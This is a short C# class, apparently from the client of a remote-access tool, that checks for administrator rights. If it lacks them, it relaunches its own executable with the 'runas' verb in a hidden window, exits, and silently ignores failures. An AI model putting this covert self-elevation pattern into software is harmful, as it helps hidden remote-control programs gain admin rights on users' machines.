﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Client.Handle_Packet
{
    public class HandleUAC
    {
        public HandleUAC()
        {
            if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            try
            {
                Process proc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = Process.GetCurrentProcess().MainModule.FileName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        Verb = "runas"
                    }
                };
                proc.Start();
                Environment.Exit(0);
            }
            catch { }
        }
    }
}
